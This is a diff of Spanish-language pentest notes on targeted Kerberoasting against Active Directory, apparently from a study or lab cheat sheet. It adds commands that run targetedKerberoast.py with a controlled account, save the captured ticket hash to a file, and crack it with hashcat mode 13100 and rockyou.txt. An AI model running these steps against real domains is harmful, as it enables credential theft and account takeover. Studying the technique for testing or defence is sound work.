@@ -30,7 +30,8 @@ Paso 1:
 
 ```powershell 
 Paso 2:
-❯ python3 targetedKerberoast.py -u "ControlledAccount" -p "password" -d "domain" --dc-ip IP
+❯ python3 targetedKerberoast.py -u 'ControlledAccount' -p 'P@$$w0rd123!' -d 'domain' --dc-ip IP
+❯ python3 targetedKerberoast.py -u 'ControlledAccount' -p 'P@$$w0rd123!' -d 'domain' --dc-ip IP > kerberoasting.tgt 
 # Esto lo hace para todos los usuarios y al usuario que encuentre con el permiso de GenericWrite le escribe temporal sobre el atributo SPN para obtener el TGT. 
 
 	# u = Usuario atacante 
@@ -40,6 +41,7 @@ Paso 2:
 ```bash 
 Paso 3:
 # Crackear el hash 
+❯ hashcat -m 13100 kerberoasting.tgt /usr/share/wordlists/rockyou.txt --force
 ❯ hashcat -m 13100 --force -a 0 --rules /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule kerberoasting.tgt /usr/share/wordlists/rockyou.txt   
 
 	# kerberoasting.tgs = Contiene el TGT del comando anterior 
